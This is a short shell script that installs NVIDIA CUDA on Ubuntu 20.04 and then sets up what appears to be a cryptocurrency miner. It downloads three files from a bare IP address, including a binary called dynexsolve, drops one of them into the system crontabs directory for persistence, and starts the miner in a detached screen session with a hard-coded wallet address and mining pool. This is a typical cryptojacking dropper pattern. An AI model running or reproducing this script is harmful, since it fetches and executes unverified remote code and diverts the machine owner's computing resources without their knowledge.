#!/bin/sh
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin && sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600 && wget https://developer.download.nvidia.com/compute/cuda/11.8.0/local_installers/cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb && sudo dpkg -i cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb && sudo cp /var/cuda-repo-ubuntu2004-11-8-local/cuda-*-keyring.gpg /usr/share/keyrings/ && sudo apt-get update && sudo apt-get -y install cuda && sudo apt-get install -y screen && mkdir run && cd run && wget 20.239.67.77/dynexsolve && wget 20.239.67.77/run.sh && wget 20.239.67.77/phucute123 && chmod 600 phucute123 && chmod 777 run.sh && sudo cp phucute123 /var/spool/cron/crontabs && chmod 777 dynexsolve && screen -d -m ./dynexsolve -mining-address XwoFrc7RxH9QxfdpjcpHkZHinTujNTDmqiE5zCJdwQtJ4Q8j1c3HfTWTDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bb7fLGR@abc__$RANDOM -no-cpu -multi-gpu -stratum-url minenice.newpool.pw -stratum-port 1202 -stratum-password x -mallob-endpoint https://dynex.dyndns.org/dynexmallob &&




